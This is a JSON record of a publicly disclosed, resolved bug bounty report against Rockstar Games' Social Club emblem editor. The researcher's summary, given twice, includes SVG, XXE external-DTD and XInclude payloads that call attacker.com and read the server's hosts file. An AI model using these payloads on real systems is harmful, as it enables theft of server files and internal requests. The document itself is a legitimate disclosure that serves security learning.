{
  "id": 347139,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNDcxMzk=",
  "url": "https://hackerone.com/reports/347139",
  "title": "LFI and SSRF via XXE in emblem editor",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2018-05-03T12:06:53.004Z",
  "submitted_at": "2018-05-03T12:06:53.004Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "alexbirsan",
    "url": "/alexbirsan",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/c8iyhelw8y0ttcuqvcjjg48epadx/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 2143,
    "url": "https://hackerone.com/rockstargames",
    "handle": "rockstargames",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/002/143/db40b290ac0adcde231da85c33a668f610e6f4df_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/143/db40b290ac0adcde231da85c33a668f610e6f4df_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Rockstar Games",
      "twitter_handle": "RockstarGames",
      "website": "http://www.rockstargames.com/",
      "about": "Publishers of such popular games as Grand Theft Auto, Max Payne, Red Dead Redemption, L.A. Noire, Bully & more."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "no-content",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2018-08-01T15:46:11.439Z",
  "bug_reporter_agreed_on_going_public_at": "2018-07-31T14:57:27.932Z",
  "team_member_agreed_on_going_public_at": "2018-08-01T15:46:11.094Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "",
  "bounty_amount": "1500.0",
  "formatted_bounty": "$1,500",
  "weakness": {
    "id": 54,
    "name": "XML External Entities (XXE)"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2018-08-30T14:57:28.136Z",
  "allow_singular_disclosure_after": -222834993.09122214,
  "singular_disclosure_allowed": true,
  "vote_count": 76,
  "voters": [
    "n1m0",
    "sp1d3rs",
    "fousekis",
    "stefanovettorazzi",
    "ramsexy",
    "nnez",
    "europa",
    "mvc",
    "mirhat",
    "muon4",
    "and 66 more..."
  ],
  "severity": {
    "rating": "critical",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 430,
    "asset_type": "URL",
    "asset_identifier": "socialclub.rockstargames.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 9682,
      "category": "team",
      "content": "This summary is provided by the researcher who submitted this report, @alexbirsan . \n\n___________________________________________________________________________________________________________________________\n\nAbout one year after I started messing with the emblem editor, I finally found a full SSRF and LFI. I was able to extract text files from the server and HTTP responses by rendering them on my crew emblem.\n\nFor those of you who are not familiar with the emblem editor, the interesting part is a SVG to PNG conversion using user supplied input. The main pieces of my exploit were mostly quirks in the ImageMagick version used by Rockstar:\n\n1. Double forward slash to reference an SMB path:\n\n    ```xml\n    <rect fill=“url(//attacker.com/malicious.svg#exploit)”>\n    ```\n    This allowed me to bypass a regex filter and load arbitrary SVG data into ImageMagick by hosting an external SVG image on my server.\n\n2. Classic XXE:\n\n    ```xml\n<!DOCTYPE svg [\n<!ENTITY % outside SYSTEM \"http://attacker.com/exfil.dtd\">\n%outside;\n]>\n<svg>\n  <defs>\n    <pattern id=\"exploit\">\n      <text x=\"10\" y=\"10\">\n        &exfil;\n      </text>\n    </pattern>\n  </defs>\n</svg>\n```\n    **exfil.dtd**\n\n    ```xml\n<!ENTITY % data SYSTEM \"file:///C:/Windows/system32/drivers/etc/hosts\">\n<!ENTITY exfil \"%data;\">\n```\n    This particular version of ImageMagick was vulnerable to a regular XXE attack. By referencing a malicious external DTD in my hosted SVG file, I could extract text files, http responses, or even files from remote shares (again, using `//`).\n\n3. Bonus method - XIncludes\n\n    ```xml\n<text x=\"10\" y=\"10\">\n    <xi:include href=\"https://www.google.com/\" parse=\"text\"/>\n</text>\n```\nIt turns out XIncludes were also supported here. This allowed me to get the same results as the XXE method, but it's a bit more reliable and straight-forward.\n\nThe final POC looked like this:\n{F293137}",
      "updated_at": "2018-08-01T15:45:53.222Z",
      "can_view?": true,
      "can_create?": false,
      "attachments": [],
      "user": {
        "id": 57954,
        "username": "jmarshall",
        "name": "JMarshall",
        "bio": "",
        "cleared": false,
        "verified": false,
        "website": null,
        "location": "",
        "created_at": "2016-02-25T14:40:27.992Z",
        "url": "https://hackerone.com/jmarshall",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "company",
        "profile_picture_urls": {
          "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
          "medium": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
          "xtralarge": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
        }
      }
    },
    {
      "id": 9679,
      "category": "researcher",
      "content": "About one year after I started messing with the emblem editor, I finally found a full SSRF and LFI. I was able to extract text files from the server and HTTP responses by rendering them on my crew emblem.\n\nFor those of you who are not familiar with the emblem editor, the interesting part is a SVG to PNG conversion using user supplied input. The main pieces of my exploit were mostly quirks in the ImageMagick version used by Rockstar:\n\n1. Double forward slash to reference an SMB path:\n\n    ```xml\n    <rect fill=“url(//attacker.com/malicious.svg#exploit)”>\n    ```\n    This allowed me to bypass a regex filter and load arbitrary SVG data into ImageMagick by hosting an external SVG image on my server.\n\n2. Classic XXE:\n\n    ```xml\n    <!DOCTYPE svg [\n    <!ENTITY % outside SYSTEM \"http://attacker.com/exfil.dtd\">\n    %outside;\n    ]>\n    <svg>\n      <defs>\n        <pattern id=\"exploit\">\n          <text x=\"10\" y=\"10\">\n            &exfil;\n          </text>\n        </pattern>\n      </defs>\n    </svg>\n    ```\n    \n    **exfil.dtd**\n    ```xml\n    <!ENTITY % data SYSTEM \"file:///C:/Windows/system32/drivers/etc/hosts\">\n    <!ENTITY exfil \"%data;\">\n    ```\n\n    This particular version of ImageMagick was vulnerable to a regular XXE attack. By referencing a malicious external DTD in my hosted SVG file, I could extract text files, http responses, or even files from remote shares (again, using `//`).\n\n3. Bonus method - XIncludes\n   \n    ```xml\n    <text x=\"10\" y=\"10\">\n        <xi:include href=\"https://www.google.com/\" parse=\"text\"/>\n    </text>\n    ```\n    \n    It turns out XIncludes were also supported here. This allowed me to get the same results as the XXE method, but it's a bit more reliable and straight-forward.\n\nThe final POC looked like this:\n{F293137}",
      "updated_at": "2018-07-31T14:58:23.392Z",
      "can_view?": true,
      "can_create?": false,
      "attachments": [],
      "user": {
        "id": 76545,
        "username": "alexbirsan",
        "name": "Alex Birsan",
        "bio": "",
        "cleared": true,
        "verified": true,
        "website": null,
        "location": "",
        "created_at": "2016-05-12T15:36:06.209Z",
        "url": "https://hackerone.com/alexbirsan",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "hacker",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/c8iyhelw8y0ttcuqvcjjg48epadx/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/c8iyhelw8y0ttcuqvcjjg48epadx/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c",
          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/c8iyhelw8y0ttcuqvcjjg48epadx/d6d8259739a2a4d509639b7804214d057bca547cc3fafe509ec3e3a86321b1d1"
        }
      }
    }
  ]
}
